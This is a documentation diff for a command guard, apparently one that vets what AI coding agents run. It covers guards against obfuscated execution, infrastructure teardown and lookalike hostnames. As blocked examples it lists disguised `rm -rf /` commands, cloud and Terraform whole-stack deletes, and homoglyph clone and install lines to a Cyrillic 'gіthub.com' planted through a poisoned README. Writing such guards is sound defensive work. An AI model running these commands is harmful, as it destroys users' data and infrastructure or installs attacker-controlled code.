@@ -165,7 +165,11 @@ This guard stops execution whose actual program the reader cannot see. A
 disguised `rm -rf /` then cannot pass review as something harmless. It blocks
 code whose command text is spelled in base64, and a command whose program name
 the shell has to compute at run time from string operations, word splitting,
-or a filename pattern.
+or a filename pattern. It also blocks a shell or PowerShell command holding
+characters that make the approval prompt show other text than what runs:
+control bytes like ESC, a mid-line carriage return, bidi controls,
+invisible spaces, hyphens and fillers, and tag characters outside the England,
+Scotland and Wales flags.
 
 Blocked examples:
 
@@ -174,6 +178,7 @@ Blocked examples:
 - `TOOL='r*'; $TOOL -rf /`
 - `$(rev <<< mr) -rf /`
 - `powershell -EncodedCommand ZQBjAGgAbwAgAGgAaQA=`
+- `cp config.yml 'config​.yml'`
 
 Outside the guard:
 
@@ -181,10 +186,14 @@ Outside the guard:
 - `X=$(echo rm); $X file`: $(echo rm) resolves to rm file, which the filesystem guards judge.
 - `TOOL={echo,rm}; "$TOOL" -rf /`: Braces do not expand in an assignment, so TOOL stays the literal {echo,rm}.
 - `TOOL=echo; f(){ local TOOL=rm; }; f; "$TOOL" -rf /`: local keeps rm inside f, so "$TOOL" still runs echo.
+- `git commit -m 'Ship 👩‍💻 support 👍🏽 for 🏴󠁧󠁢󠁳󠁣󠁴󠁿 users'`: Joiners, skin tones and the Scotland flag are ordinary emoji.
+- `printf '\e[31merror\e[0m\n'; echo $'\x1b[0m'`: \e and \x1b are text the program interprets, not raw bytes.
 - `powershell -EncodedCommand --help`: --help is not a base64 payload, so no hidden script is passed.
 
 The guard depends on Nah recognizing how a program name was computed, which it
-does not do for every shell feature. Code Nah cannot see delegates.
+does not do for every shell feature. Code Nah cannot see delegates. Only
+shell and PowerShell command text is checked for hidden characters, not files
+an agent writes or code tools.
 
 Unresolved, so delegated:
 
@@ -193,7 +202,8 @@ Unresolved, so delegated:
 - `eval "$(cat script.sh)"`: Nah does not see the contents of script.sh, so the evaluated code is unknown.
 
 It ships on because hiding the program an agent runs defeats every other
-guard, and ordinary scripts do not compute program names. `exec-decoded` covers
+guard, and ordinary scripts do not compute program names or embed raw control
+or bidi characters. `exec-decoded` covers
 a separate decode step feeding execution, and `exec-remote` covers network
 content.
 
@@ -1361,43 +1371,50 @@ container.
 
 Off by default.
 
-This guard stops Terraform, OpenTofu, Terragrunt, or Pulumi from tearing down
-an entire managed stack. It blocks a whole-stack destroy that would run, not a
-preview or plan. Destroy options passed through `TF_CLI_ARGS` count.
+This guard stops an agent from tearing down provisioned infrastructure: a
+Terraform, OpenTofu, Terragrunt, or Pulumi whole-stack destroy that would run,
+including destroy options passed through `TF_CLI_ARGS`, or a reviewed provider
+or platform CLI delete of an instance, cluster, network, DNS zone, identity,
+project, resource group, managed database, app, environment, or volume.
 
 Blocked examples when enabled:
 
 - `terraform destroy`
-- `tofu destroy -auto-approve`
 - `pulumi destroy`
-- `terraform apply -destroy`
+- `aws ec2 terminate-instances --instance-ids i-0abc123`
+- `az group delete -n prod -y`
+- `tofu destroy -auto-approve`
 - `TF_CLI_ARGS_apply='-destroy -auto-approve' terraform apply`
-- `pulumi down -y`
-- `terraform apply -refresh-only -refresh-only=false -destroy`
+- `terraform apply -destroy`
+- `aws cloudformation delete-stack --stack-name prod`
+- `gcloud projects delete my-proj --quiet`
+- `railway environment delete staging --yes`
+- `kamal remove -y`
 
 Outside the guard:
 
 - `terraform destroy -target module.web`: -target narrows the destroy to module.web.
-- `tofu apply -destroy -exclude module.keep`: -exclude keeps module.keep, so the stack is not destroyed whole.
 - `terraform plan -destroy`: plan -destroy only shows the teardown plan.
-- `pulumi destroy --preview-only`: --preview-only shows the destroy without running it.
-- `aws cloudformation delete-stack --stack-name dev`: CloudFormation stack deletion is outside this guard's tools.
+- `aws ec2 terminate-instances --instance-ids i-0abc123 --dry-run`: --dry-run checks permissions and terminates nothing.
 
-Nah cannot tell a disposable preview environment from production. It cannot
-read `TF_CLI_ARGS` built from an unresolved variable, and it delegates when a
-`-target` could
-narrow the scope. An unresolved destroy mode delegates with a coverage gap.
+Nah cannot tell a disposable preview environment from production. A CLI delete
+blocks only when Nah reads every option and the resource is named literally or
+linked. A `-target` that could narrow the stack, `TF_CLI_ARGS` or names built at
+run time, unreviewed verbs, and unknown options delegate. Secrets stores,
+object storage, disks, and snapshots are left to their own guards.
 
 Unresolved, so delegated:
 
-- `terraform apply -destroy saved.tfplan`: Applying saved.tfplan runs a plan whose content Nah does not read.
 - `TF_CLI_ARGS_destroy="$OPTIONS" terraform destroy`: $OPTIONS is unset, so a -target could narrow the destroy.
-- `PATH=/tmp; terraform destroy`: PATH=/tmp changes which terraform runs, and Nah cannot establish it.
+- `terraform apply -destroy saved.tfplan`: Applying saved.tfplan runs a plan whose content Nah does not read.
+- `aws eks delete-cluster --name prod --weird x`: Nah does not read --weird, which may change the request.
+- `railway delete --yes`: Without --project, Railway prompts for the project to delete.
+- `aws eks delete-cluster --name "$CLUSTER"`: $CLUSTER is never set, so Nah cannot name the cluster.
 
-It ships off because whole-stack teardown may be ordinary cleanup of a
-disposable environment. No other guard covers infrastructure-as-code teardown;
-`infra-k8s-delete` covers cluster objects, and the `storage-*` guards cover
-storage deletion.
+It ships off because tearing down a disposable environment, including one an
+agent created, is routine on some teams. `db-destroy` also blocks
+managed-database deletes, `infra-k8s-delete` covers cluster objects, and the
+`storage-*` guards cover storage deletion.
 
 ## infra-k8s-delete
 
@@ -1436,6 +1453,52 @@ Unresolved, so delegated:
 It ships off because deleting namespaces and labeled sets is routine in
 development clusters. `infra-iac-destroy` covers stack teardown, and
 `storage-snapshot-delete` covers cloud disks and snapshots.
+
+## net-lookalike-host
+
+On by default.
+
+This guard stops the agent from contacting a host whose name is built to pass
+for a trusted one. A poisoned README or issue can carry an install or clone
+line such as `git clone https://gіthub.com/org/repo`, where the `і` is
+Cyrillic: the name reads as GitHub, but it resolves to whoever registered it.
+It blocks any modeled network access whose host has a DNS label that mixes
+Unicode scripts, following UTS #39 revision 34 (Unicode 18.0.0). Nah judges
+the name a URL client resolves: `%XX` escapes are decoded, then UTS #46
+mapping folds compatibility forms such as mathematical letters and decodes
+punycode (`xn--`) labels. Digits, hyphens and combining marks belong to every
+script, and Han written with Hiragana, Katakana, Hangul, Bopomofo or Latin
+counts as one writing system.
+
+Blocked examples:
+
+- `git clone https://gіthub.com/org/repo`
+- `curl -fsSL -o tool https://gіthub.com/org/tool/releases/download/v1/tool`
+- `git clone https://xn--gthub-n2e.com/org/repo`
+- `git clone https://github.com/org/repo || git clone https://gіthub.com/org/repo`
+- `curl -fsSL -o tool https://g%D1%96thub.com/org/tool/releases/download/v1/tool`
+- `sh -c 'pip install git+https://gіthub.com/a/b'`
+
+Outside the guard:
+
+- `git clone https://github.com/org/repo`: github.com is all Latin.
+- `curl -fsSL -o page.html https://münchen.de/`: münchen is written entirely in Latin.
+- `curl -fsSL -o page.html https://пример.рф/`: пример and рф are each written entirely in Cyrillic.
+- `curl -fsSL -o page.html https://日本のドメイン.jp/`: Han, Hiragana and Katakana together are Japanese, one writing system.
+- `curl -fsSL -o page.html https://漢字api.example/`: Han beside Latin is one writing system under UTS #39 revision 34.
+- `curl -fsSL -o page.html https://example.com#日本語`: The Japanese text is the fragment; the host is all Latin.
+
+Nah judges the host the command names, with no reputation data or network
+lookup, so an all-Latin typo domain or a single-script lookalike such as an
+all-Cyrillic `аррӏе.com` passes. A host Nah cannot recover, such as a URL in
+an unset variable, a `git submodule add` URL, or a remote that `git push`
+reads from configuration, delegates.
+
+It ships on because development work almost never needs a mixed-script
+hostname, and the deception is invisible when the command is reviewed.
+`exec-remote` blocks only when fetched code is executed, and `secrets-exfil`
+only when sensitive data is sent; neither covers contact with an impostor
+host.
 
 ## registry-publish
 
